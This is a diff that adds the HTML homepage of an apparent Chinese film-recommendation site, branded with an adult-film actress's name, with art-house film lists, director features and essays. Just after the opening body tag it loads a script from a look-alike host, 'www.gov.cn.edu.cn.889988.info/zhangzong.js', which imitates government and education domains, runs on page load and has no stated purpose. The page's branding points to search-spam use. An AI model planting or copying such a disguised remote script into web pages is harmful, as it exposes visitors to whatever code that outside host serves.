@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<title>波多野结衣电影网 — 亚洲文艺电影与独立佳片的私人放映室</title>
+<meta name="keywords" content="波多野结衣电影网,亚洲文艺片,独立电影推荐,日本电影,小众佳片,胶片质感,深夜影院">
+<meta name="description" content="波多野结衣电影网，专注发掘亚洲文艺电影与独立小众佳片。在霓虹与胶片之间，为你挑选每一部值得静下心来看的电影，一个属于影迷的安静放映室。">
+<meta name="author" content="波多野结衣电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#2b2118">
+<link rel="canonical" href="https://boduoyejieyidianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --paper:#f5f1ea;--paper2:#efe9df;--ink:#33281c;--ink2:#6a5c4a;--mute:#9a8d7a;
+  --wood:#7a5230;--wood-l:#9a6a3e;--cinnabar:#b03a2e;--cinnabar-l:#d9534f;
+  --gold:#b08d57;--jade:#4a6b5e;--line:rgba(122,82,48,.16);--max:1160px;--r:14px;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Songti SC","STSong","SimSun","Noto Serif CJK SC",Georgia,"PingFang SC",serif;
+  background:var(--paper);color:var(--ink);line-height:1.85;font-size:15px;overflow-x:hidden;
+  background-image:radial-gradient(circle at 20% 10%,rgba(176,141,87,.07),transparent 45%),
+    radial-gradient(circle at 85% 75%,rgba(122,82,48,.06),transparent 40%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{max-width:100%;display:block}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 20px}
+.kanji{font-family:"Songti SC","STSong",serif}
+
+/* 顶部通栏 */
+.mast{background:linear-gradient(180deg,#2b2118,#35281d);color:#f0e9dd;padding:16px 0 0;border-bottom:3px solid var(--cinnabar)}
+.brand-row{display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.seal{width:52px;height:52px;border:2px solid var(--gold);border-radius:10px;display:flex;align-items:center;
+  justify-content:center;color:var(--gold);font-size:25px;flex-shrink:0;box-shadow:inset 0 0 0 4px rgba(176,141,87,.15)}
+.brand-txt h1{font-size:23px;font-weight:700;letter-spacing:2px;line-height:1.3}
+.brand-txt h1 s{text-decoration:none;color:var(--gold);font-size:20px}
+.brand-txt p{font-size:11.5px;color:var(--mute);letter-spacing:4px;text-transform:uppercase;margin-top:2px}
+.mast-r{margin-left:auto;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.mast-r .hi{font-size:13px;color:#e6dccb;background:rgba(176,141,87,.14);padding:7px 16px;border-radius:20px}
+.mast-r button{border:1.5px solid rgba(176,141,87,.45);background:transparent;color:#f0e9dd;padding:7px 18px;
+  border-radius:20px;font-size:13px;cursor:pointer;font-family:inherit;transition:.2s}
+.mast-r button:hover{background:var(--cinnabar);border-color:var(--cinnabar)}
+.menu-btn{display:none;width:44px;height:44px;border:1.5px solid rgba(176,141,87,.4);border-radius:10px;
+  background:transparent;color:var(--gold);font-size:20px;cursor:pointer;flex-shrink:0}
+
+/* 主导航 */
+.gnav{margin-top:16px;border-top:1px solid rgba(176,141,87,.18)}
+.gnav ul{display:flex;gap:2px;flex-wrap:wrap}
+.gnav a{padding:13px 20px;font-size:15px;font-weight:600;color:#d8cdb8;letter-spacing:1px;position:relative;transition:.18s}
+.gnav a:hover{color:#fff}
+.gnav a.cur{color:#fff}
+.gnav a.cur::before{content:"◆";position:absolute;left:6px;top:50%;transform:translateY(-50%);color:var(--gold);font-size:9px}
+
+/* 卷首语 Hero */
+.opening{padding:34px 0 24px}
+.opening-inner{background:var(--paper2);border:1px solid var(--line);border-radius:var(--r);padding:32px 38px;
+  position:relative;box-shadow:0 6px 24px rgba(51,40,28,.06)}
+.opening-inner::before{content:"「";position:absolute;left:16px;top:6px;font-size:46px;color:var(--gold);opacity:.4;font-family:serif}
+.opening-inner::after{content:"」";position:absolute;right:16px;bottom:-18px;font-size:46px;color:var(--gold);opacity:.4;font-family:serif}
+.opening h2{font-size:26px;font-weight:700;letter-spacing:2px;margin-bottom:12px;color:var(--wood)}
+.opening h2 span{color:var(--cinnabar)}
+.opening p{font-size:15.5px;color:var(--ink2);max-width:820px;text-indent:2em;text-align:justify}
+.opening .ink-line{margin-top:18px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.opening .ink-line i{font-style:normal;font-size:12.5px;color:var(--wood);background:rgba(122,82,48,.1);
+  padding:5px 14px;border-radius:16px}
+
+/* 栏目通用 */
+.section{padding:40px 0}
+.sec-title{display:flex;align-items:baseline;gap:14px;margin-bottom:6px;flex-wrap:wrap;border-bottom:2px solid var(--wood);padding-bottom:12px}
+.sec-title .no{font-size:13px;color:var(--paper2);background:var(--wood);padding:2px 9px;border-radius:4px;font-weight:700}
+.sec-title h3{font-size:21px;font-weight:700;letter-spacing:2px}
+.sec-title h3 small{display:block;font-size:11px;font-weight:400;color:var(--mute);letter-spacing:3px;text-transform:uppercase}
+.sec-title .more{margin-left:auto;font-size:13px;color:var(--wood);border-bottom:1px dashed var(--wood);padding-bottom:1px}
+.sec-title .more:hover{color:var(--cinnabar);border-color:var(--cinnabar)}
+
+/* 筛签 */
+.tags{display:flex;gap:8px;flex-wrap:wrap;margin:18px 0 22px}
+.tag{padding:5px 15px;background:#fff;border:1px solid var(--line);border-radius:6px;font-size:13.5px;color:var(--ink2);cursor:pointer;transition:.18s;font-family:inherit}
+.tag:hover{border-color:var(--wood);color:var(--wood)}
+.tag.on{background:var(--wood);border-color:var(--wood);color:#fff}
+
+/* 电影列表 */
+.films{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:22px}
+.film{background:#fff;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.3s;position:relative}
+.film:hover{transform:translateY(-5px);box-shadow:0 16px 34px rgba(51,40,28,.13);border-color:var(--gold)}
+.film .thumb{position:relative;aspect-ratio:4/5;overflow:hidden}
+.film .thumb img{width:100%;height:100%;object-fit:cover;filter:sepia(.14) contrast(1.02);transition:.6s}
+.film:hover .thumb img{transform:scale(1.06);filter:none}
+.film .badge{position:absolute;top:12px;left:12px;background:var(--cinnabar);color:#fff;font-size:11px;font-weight:700;padding:3px 9px;border-radius:3px}
+.film .yr{position:absolute;top:12px;right:12px;background:rgba(43,33,24,.8);color:#f0e9dd;font-size:11.5px;padding:3px 9px;border-radius:3px}
+.film .info{padding:14px 16px 16px}
+.film .info h4{font-size:16px;font-weight:700;letter-spacing:.5px;margin-bottom:7px}
+.film .info .line{display:flex;justify-content:space-between;font-size:12.5px;color:var(--ink2);border-top:1px dashed var(--line);padding-top:8px}
+.film .info .line b{color:var(--cinnabar);font-weight:800}
+
+/* 特写：左右结构 */
+.spot{display:grid;grid-template-columns:1.15fr .85fr;gap:26px}
+.spot-l{position:relative;border-radius:var(--r);overflow:hidden;min-height:420px}
+.spot-l img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:sepia(.2)}
+.spot-l .glass{position:absolute;left:0;right:0;bottom:0;padding:26px;color:#fff;
+  background:linear-gradient(to top,rgba(35,26,18,.95),rgba(35,26,18,.55) 60%,transparent)}
+.spot-l .glass .k{font-size:11px;letter-spacing:3px;color:#f0d9a8;margin-bottom:7px;display:block}
+.spot-l .glass h4{font-size:24px;font-weight:700;letter-spacing:1px;margin-bottom:9px}
+.spot-l .glass p{font-size:13.5px;color:rgba(255,255,255,.88)}
+.spot-r{display:flex;flex-direction:column;gap:14px}
+.note{border-left:4px solid var(--wood);background:#fff;padding:14px 18px;border-radius:0 var(--r) var(--r) 0;transition:.25s}
+.note:hover{background:var(--paper2)}
+.note .h{display:flex;justify-content:space-between;align-items:baseline;gap:10px}
+.note .h b{font-size:16px;font-weight:700;letter-spacing:.5px}
+.note .h em{font-style:normal;font-size:12px;color:var(--mute);flex-shrink:0}
+.note p{font-size:13px;color:var(--ink2);margin-top:6px}
+.note .src{font-size:11.5px;color:var(--wood);margin-top:8px}
+
+/* 片单时间轴 */
+.tl{position:relative;padding-left:8px}
+.tl-i{display:flex;gap:22px;background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:16px;margin-bottom:16px;transition:.25s}
+.tl-i:hover{border-color:var(--wood);box-shadow:0 8px 22px rgba(51,40,28,.08)}
+.tl-i .idx{width:56px;flex-shrink:0;text-align:center;border-right:1px dashed var(--line);padding-right:16px}
+.tl-i .idx strong{display:block;font-size:26px;color:var(--gold);font-weight:700;font-family:Georgia,serif}
+.tl-i .idx span{font-size:11px;color:var(--mute);letter-spacing:1px}
+.tl-i .body{flex:1;min-width:0}
+.tl-i .body h4{font-size:16px;font-weight:700;letter-spacing:.5px;margin-bottom:5px}
+.tl-i .body .meta{font-size:12.5px;color:var(--ink2);margin-bottom:7px}
+.tl-i .body p{font-size:13px;color:var(--ink2);text-align:justify}
+
+/* 杂谈：两列 */
+.notes{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.essay{background:var(--paper2);border:1px solid var(--line);border-radius:var(--r);padding:22px 24px;transition:.25s}
+.essay:hover{background:#fff}
+.essay .cat{font-size:11.5px;letter-spacing:2px;color:var(--cinnabar);font-weight:700}
+.essay h4{font-size:17px;font-weight:700;margin:9px 0 10px;letter-spacing:.5px}
+.essay p{font-size:13.5px;color:var(--ink2);text-align:justify}
+.essay .foot{margin-top:14px;padding-top:10px;border-top:1px solid var(--line);font-size:12px;color:var(--mute);display:flex;justify-content:space-between}
+
+/* 手记/关于 */
+.colophon{background:#2b2118;color:#e6dccb;border-radius:var(--r);padding:34px 36px;position:relative;overflow:hidden}
+.colophon::before{content:"影";position:absolute;right:-10px;bottom:-30px;font-size:180px;color:rgba(176,141,87,.07);font-family:serif}
+.colophon h3{font-size:22px;letter-spacing:2px;margin-bottom:6px;color:#fff}
+.colophon .sub{font-size:12px;letter-spacing:4px;color:var(--gold);margin-bottom:18px;text-transform:uppercase}
+.colophon p{font-size:14px;color:#c9bda6;margin-bottom:10px;text-align:justify;position:relative;z-index:1}
+.cols{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-top:24px}
+.cols div{background:rgba(255,255,255,.05);border:1px solid rgba(176,141,87,.2);border-radius:10px;padding:18px}
+.cols div h5{font-size:15px;color:var(--gold);margin-bottom:6px;letter-spacing:1px}
+.cols div p{font-size:13px;color:#c9bda6;margin:0}
+
+/* 页脚 */
+footer{background:#211912;color:#a89a85;padding:38px 0 0;margin-top:44px}
+.f-grid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:30px;margin-bottom:26px}
+footer h5{color:#f0e9dd;font-size:15px;letter-spacing:1px;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid rgba(176,141,87,.2)}
+footer ul a{display:block;padding:5px 0;font-size:13px;color:#a89a85;transition:.18s}
+footer ul a:hover{color:var(--gold);padding-left:6px}
+.f-about p{font-size:13px;line-height:1.9}
+.f-bot{text-align:center;border-top:1px solid rgba(176,141,87,.16);padding:18px 0;font-size:12.5px;color:#7d7160;line-height:1.8}
+.f-bot b{color:var(--gold)}
+
+/* 右侧浮窗 */
+.float{position:fixed;right:16px;bottom:22px;z-index:90;display:flex;flex-direction:column;gap:9px}
+.float button{width:46px;height:46px;border-radius:50%;border:1px solid var(--line);background:var(--paper2);
+  color:var(--wood);font-size:16px;cursor:pointer;box-shadow:0 6px 18px rgba(51,40,28,.14);opacity:0;
+  transform:translateY(10px);pointer-events:none;transition:.3s;font-family:inherit}
+.float button.show{opacity:1;transform:translateY(0);pointer-events:auto}
+.float button:hover{background:var(--cinnabar);color:#fff;border-color:var(--cinnabar)}
+
+@media(max-width:900px){
+  .menu-btn{display:block}
+  .mast-r .hi{display:none}
+  .gnav ul{flex-direction:column;max-height:0;overflow:hidden;transition:.35s}
+  .gnav ul.open{max-height:520px}
+  .gnav a{width:100%;border-bottom:1px solid rgba(176,141,87,.12)}
+  .gnav a.cur::before{left:auto;right:16px}
+  .opening-inner{padding:26px 20px}
+  .opening h2{font-size:21px}
+  .spot{grid-template-columns:1fr}
+  .notes{grid-template-columns:1fr}
+  .f-grid{grid-template-columns:1fr 1fr;gap:22px}
+}
+@media(max-width:560px){
+  body{font-size:14.5px}
+  .films{grid-template-columns:repeat(2,1fr);gap:13px}
+  .film .info{padding:11px 12px 13px}
+  .film .info h4{font-size:14.5px}
+  .tl-i{flex-direction:column;gap:10px}
+  .tl-i .idx{border-right:0;border-bottom:1px dashed var(--line);padding:0 0 8px;text-align:left;display:flex;align-items:baseline;gap:8px}
+  .section{padding:30px 0}
+  .sec-title h3{font-size:18px}
+  .f-grid{grid-template-columns:1fr}
+  .colophon{padding:26px 20px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 报头 -->
+<header class="mast">
+  <div class="wrap brand-row">
+    <div class="seal kanji">影</div>
+    <div class="brand-txt">
+      <h1>波多野结衣<span>电影网</span></h1>
+      <p>A Private Screening Room · 私人放映室</p>
+    </div>
+    <div class="mast-r">
+      <span class="hi">🕯️ 今日宜 · 安静看片</span>
+      <button>订阅片单</button>
+      <button class="menu-btn" id="mb">☰</button>
+    </div>
+  </div>
+  <nav class="gnav">
+    <div class="wrap">
+      <ul id="gmenu">
+        <li><a href="#top" class="cur">卷首</a></li>
+        <li><a href="#pick">精选片库</a></li>
+        <li><a href="#spot">本期特写</a></li>
+        <li><a href="#list">十日片单</a></li>
+        <li><a href="#note">观影杂谈</a></li>
+        <li><a href="#colophon">放映手记</a></li>
+      </ul>
+    </div>
+  </nav>
+</header>
+
+<!-- 卷首语 -->
+<section class="opening" id="top">
+  <div class="wrap">
+    <div class="opening-inner">
+      <h2>在霓虹与胶片之间，<br>为你留住<span>每一帧值得静下心来看的影像</span></h2>
+      <p>波多野结衣电影网不是一个追求快与多的平台，我们更愿意做那个帮你挑片的朋友。每一部被放进片库的作品，都经过观影人的亲手筛选——它或许不是票房最高的，但一定在某一个夜晚，能让你慢下来、静下来，与屏幕里的某个人物、某段旋律、某束光产生一次真实的共鸣。</p>
+      <div class="ink-line">
+        <i>文艺 · 独立</i><i>亚洲电影</i><i>胶片质感</i><i>深夜放映</i><i>每周更新</i>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 精选片库 -->
+<section class="section" id="pick">
+  <div class="wrap">
+    <div class="sec-title">
+      <span class="no">壹</span><h3>精选片库<small>Curated Collection</small></h3>
+      <a href="#" class="more">浏览全部片库 →</a>
+    </div>
+    <div class="tags">
+      <span class="tag on">本周推荐</span><span class="tag">日本电影</span><span class="tag">华语文艺</span>
+      <span class="tag">韩国独立</span><span class="tag">东南亚</span><span class="tag">短片单元</span><span class="tag">纪录片</span>
+    </div>
+    <div class="films">
+      <article class="film"><div class="thumb"><img src="https://picsum.photos/seed/f1/400/500" alt="春信迟迟">
+        <span class="badge">本期主打</span><span class="yr">2025 · 日本</span></div>
+        <div class="info"><h4>春信迟迟</h4>
+          <p style="font-size:13px;color:var(--ink2)">一位老邮差在小镇里等待一封迟迟未到的信，季节更迭中，他逐渐读懂了自己的人生。</p>
+          <div class="line"><span>文艺 / 治愈</span><b>8.7</b></div></div></article>
+      <article class="film"><div class="thumb"><img src="https://picsum.photos/seed/f2/400/500" alt="夜航船">
+        <span class="yr">2024 · 中国台湾</span></div>
+        <div class="info"><h4>夜航船</h4>
+          <p style="font-size:13px;color:var(--ink2)">一艘深夜渡轮，串联起三个陌生人关于告别与出发的故事。</p>
+          <div class="line"><span>剧情 / 群像</span><b>8.5</b></div></div></article>
+      <article class="film"><div class="thumb"><img src="https://picsum.photos/seed/f3/400/500" alt="便利店少女">
+        <span class="badge">新片</span><span class="yr">2026 · 韩国</span></div>
+        <div class="info"><h4>便利店少女</h4>
+          <p style="font-size:13px;color:var(--ink2)">凌晨三点的便利店，是城市里最后的避难所，也是她重新认识世界的起点。</p>
+          <div class="line"><span>独立 / 青春</span><b>8.3</b></div></div></article>
+      <article class="film"><div class="thumb"><img src="https://picsum.photos/seed/f4/400/500" alt="海与他的星期天">
+        <span class="yr">2023 · 日本</span></div>
+        <div class="info"><h4>海与他的星期天</h4>
+          <p style="font-size:13px;color:var(--ink2)">失语的少年与一位退休灯塔看守人，在一个夏天里交换了彼此最珍贵的东西。</p>
+          <div class="line"><span>治愈 / 成长</span><b>8.9</b></div></div></article>
+      <article class="film"><div class="thumb"><img src="https://picsum.photos/seed/f5/400/500" alt="无人之境">
+        <span class="badge">口碑</span><span class="yr">2025 · 中国</span></div>
+        <div class="info"><h4>无人之境</h4>
+          <p style="font-size:13px;color:var(--ink2)">西北荒原上，一位牧羊人与一台废弃电台之间，发生了一段安静而有力的对话。</p>
+          <div class="line"><span>艺术 / 现实</span><b>9.0</b></div></div></article>
+      <article class="film"><div class="thumb"><img src="https://picsum.photos/seed/f6/400/500" alt="雨日的五个瞬间">
+        <span class="yr">2026 · 菲律宾</span></div>
+        <div class="info"><h4>雨日的五个瞬间</h4>
+          <p style="font-size:13px;color:var(--ink2)">一场连绵的雨季，让五个原本无关的人，在马尼拉的小巷里短暂相遇。</p>
+          <div class="line"><span>短片集 / 生活</span><b>8.2</b></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 本期特写 -->
+<section class="section" id="spot" style="background:rgba(239,233,223,.55)">
+  <div class="wrap">
+    <div class="sec-title">
+      <span class="no">贰</span><h3>本期特写<small>Feature of the Month</small></h3>
+      <a href="#" class="more">往期特写 →</a>
+    </div>
+    <div class="spot">
+      <div class="spot-l">
+        <img src="https://picsum.photos/seed/ft/800/700" alt="特写">
+        <div class="glass">
+          <span class="k">FEATURE · 本月导演专题</span>
+          <h4>是枝裕和之后的日本家庭电影</h4>
+          <p>从《小偷家族》到新一代导演的镜头里，日本电影如何用最克制的叙事，讲最汹涌的家庭情感。本期特写带你走进三位值得关注的当代日本导演。</p>
+        </div>
+      </div>
+      <div class="spot-r">
+        <div class="note"><div class="h"><b>滨口龙介：对话的重量</b><em>长片 03:00:00</em></div>
+          <p>他相信台词本身就是戏剧。本期解析《驾驶我的车》背后的舞台剧结构与长镜头美学。</p>
+          <div class="src">来源 · 导演访谈整理</div></div>
+        <div class="note"><div class="h"><b>深田晃司：边缘人的温柔注视</b><em>中篇 01:48:00</em></div>
+          <p>《临渊而立》如何用一场意外的闯入，撬动整个家庭的平静。</p>
+          <div class="src">来源 · 影像评论</div></div>
+        <div class="note"><div class="h"><b>早川千绘：真实与虚构的边界</b><em>短片 00:58:00</em></div>
+          <p>从纪录片起步的她，如何用非职业演员还原最贴近生活的瞬间。</p>
+          <div class="src">来源 · 新片速递</div></div>
+        <div class="note"><div class="h"><b>配乐里的东方留白</b><em>随笔</em></div>
+          <p>为何日本家庭电影偏爱用一段沉默，而不是一首主题曲来结束全片。</p>
+          <div class="src">来源 · 观影杂谈</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 十日片单 -->
+<section class="section" id="list">
+  <div class="wrap">
+    <div class="sec-title">
+      <span class="no">叁</span><h3>十日片单<small>10-Day Watchlist</small></h3>
+      <a href="#" class="more">更多片单 →</a>
+    </div>
+    <p style="color:var(--ink2);font-size:14px;margin-bottom:22px">每周一更新，一次推荐十部，看完刚好填满你接下来的十个夜晚。</p>
+    <div class="tl">
+      <div class="tl-i"><div class="idx"><strong>01</strong><span>10.04</span></div>
+        <div class="body"><h4>小森林 夏秋篇</h4>
+          <div class="meta">日本 / 2014 / 剧情 · 治愈 · 美食</div>
+          <p>市子回到故乡小森村，在一餐一饭的劳作中，重新学会与孤独相处。适合一个人、一杯茶、一个安静的夜晚。</p></div></div>
+      <div class="tl-i"><div class="idx"><strong>02</strong><span>10.05</span></div>
+        <div class="body"><h4>海边电影院</h4>
+          <div class="meta">日本 / 2019 / 剧情 · 怀旧</div>
+          <p>一座即将被拆除的海边影院，串联起三代电影人与无数观众的记忆。关于电影如何成为一个人一生的注脚。</p></div></div>
+      <div class="tl-i"><div class="idx"><strong>03</strong><span>10.06</span></div>
+        <div class="body"><h4>气球</h4>
+          <div class="meta">中国 / 2019 / 剧情 · 民族</div>
+          <p>藏区草原上的一个家庭，因一只气球而陷入信仰与现实的拉扯。克制、有力、充满信仰质感。</p></div></div>
+      <div class="tl-i"><div class="idx"><strong>04</strong><span>10.07</span></div>
+        <div class="body"><h4>蜂鸟</h4>
+          <div class="meta">韩国 / 2018 / 青春 · 成长</div>
+          <p>1994 年的首尔，一个十四岁女孩在家庭的喧嚣与时代的缝隙中，悄悄长成了自己。</p></div></div>
+      <div class="tl-i"><div class="idx"><strong>05</strong><span>10.08</span></div>
+        <div class="body"><h4>行星组曲</h4>
+          <div class="meta">越南 / 2022 / 文艺 · 诗意</div>
+          <p>三个互不相识的人，在一座热带城市的雨季里，各自经历着爱与失去。影像如诗，节奏舒缓。</p></div></div>
+      <div class="tl-i"><div class="idx"><strong>06</strong><span>10.09</span></div>
+        <div class="body"><h4>岁月自珍</h4>
+          <div class="meta">日本 / 2021 / 剧情 · 老年</div>
+          <p>两位老人决定为自己的人生做最后一次自主选择。温柔、幽默，又带着令人动容的尊严。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 观影杂谈 -->
+<section class="section" id="note" style="background:rgba(239,233,223,.55)">
+  <div class="wrap">
+    <div class="sec-title">
+      <span class="no">肆</span><h3>观影杂谈<small>Notes &amp; Essays</small></h3>
+      <a href="#" class="more">全部文章 →</a>
+    </div>
+    <div class="notes">
+      <div class="essay"><div class="cat">光影随笔</div>
+        <h4>为什么我们越来越需要「慢电影」</h4>
+        <p>当短视频把我们的注意力切碎，长镜头与留白反而成了一种奢侈的治愈。慢，不是拖沓，而是一种对生活细节的重新尊重。</p>
+        <div class="foot"><span>文 / 放映室主理人</span><span>🕐 4 小时前</span></div></div>
+      <div class="essay"><div class="cat">观影指南</div>
+        <h4>一个人看的十部电影，胜过一群人的喧闹</h4>
+        <p>不必等待同伴，不必迁就口味。这份独处片单，献给所有享受一个人待在屏幕前的夜晚的你。</p>
+        <div class="foot"><span>文 / 选片编辑</span><span>🕐 昨天</span></div></div>
+      <div class="essay"><div class="cat">幕后手记</div>
+        <h4>那些年被我们「错过」的亚洲独立电影</h4>
+        <p>它们没有铺天盖地的宣传，却藏着最真诚的表达。如何让好电影不再被埋没，是我们在做的事。</p>
+        <div class="foot"><span>文 / 内容团队</span><span>🕐 2 天前</span></div></div>
+      <div class="essay"><div class="cat">推荐理由</div>
+        <h4>选择一部电影，其实是选择一种心情</h4>
+        <p>高兴时看喜剧，疲惫时看治愈，迷茫时看公路片。电影是情绪的容器，也是情绪的出口。</p>
+        <div class="foot"><span>文 / 观影人小满</span><span>🕐 3 天前</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 放映手记 -->
+<section class="section" id="colophon">
+  <div class="wrap">
+    <div class="colophon">
+      <h3>放映手记</h3>
+      <div class="sub">Colophon · 关于这个放映室</div>
+      <p>波多野结衣电影网（boduoyejieyidianyingwang-zh.github.io）是一个由影迷为影迷打造的安静角落。我们不追求数量与速度，只关心你今晚是否找到了一部对味的片子。</p>
+      <p>这里的每一份片单、每一篇短评，都来自真实的观看与感受。我们关注亚洲文艺电影、独立佳作与小众短片，希望让更多值得被看见的作品，遇见愿意静下来看的人。</p>
+      <div class="cols">
+        <div><h5>🎞 精挑细选</h5><p>每部片子都经过观影人亲手筛选，不靠算法堆量。</p></div>
+        <div><h5>🕯 安静观看</h5><p>没有嘈杂干扰，只有一个干净的画面和一段好故事。</p></div>
+        <div><h5>✍ 手写短评</h5><p>拒绝模板化介绍，用最真诚的文字告诉你为什么值得看。</p></div>
+        <div><h5>🌏 东方视角</h5><p>聚焦亚洲影像，关注那些被主流视线忽略的好作品。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div class="f-about">
+        <h5>波多野结衣电影网</h5>
+        <p>一个属于影迷的私人放映室。用安静的姿态，陪你看好每一部值得被看见的亚洲文艺电影与独立佳作。</p>
+      </div>
+      <div><h5>栏目导航</h5>
+        <ul><li><a href="#top">卷首语</a></li><li><a href="#pick">精选片库</a></li>
+        <li><a href="#spot">本期特写</a></li><li><a href="#list">十日片单</a></li></ul></div>
+      <div><h5>选片类型</h5>
+        <ul><li><a href="#">文艺剧情</a></li><li><a href="#">治愈成长</a></li>
+        <li><a href="#">独立短片</a></li><li><a href="#">纪录片</a></li></ul></div>
+      <div><h5>放映室</h5>
+        <ul><li><a href="#colophon">关于本站</a></li><li><a href="#">投稿与合作</a></li>
+        <li><a href="#">观影交流</a></li><li><a href="#">片单订阅</a></li></ul></div>
+    </div>
+    <div class="f-bot">
+      © 2026 波多野结衣电影网 · 网站网址：<b>https://boduoyejieyidianyingwang-zh.github.io</b><br>
+      本站为影视资讯与交流平台，所涉影片信息仅供观影参考，版权归各出品方与发行方所有。
+    </div>
+  </div>
+</footer>
+
+<div class="float"><button id="toTop" title="返回卷首">↑</button></div>
+
+<script>
+// 移动端菜单
+var mb=document.getElementById('mb'),gm=document.getElementById('gmenu');
+mb.addEventListener('click',function(){gm.classList.toggle('open')});
+gm.addEventListener('click',function(e){if(e.target.tagName==='A')gm.classList.remove('open')});
+
+// 筛签切换
+document.querySelectorAll('.tag').forEach(function(t){
+  t.addEventListener('click',function(){
+    this.parentNode.querySelectorAll('.tag').forEach(function(x){x.classList.remove('on')});
+    this.classList.add('on');
+  });
+});
+
+// 导航高亮
+var links=document.querySelectorAll('.gnav a');
+var secs=document.querySelectorAll('section[id]');
+var topBtn=document.getElementById('toTop');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+130,idx=0;
+  secs.forEach(function(s,i){if(s.offsetTop<=y)idx=i});
+  links.forEach(function(a,i){a.classList.toggle('cur',i===idx)});
+  topBtn.classList.toggle('show',window.scrollY>600);
+});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+</script>
+</body>
+</html>
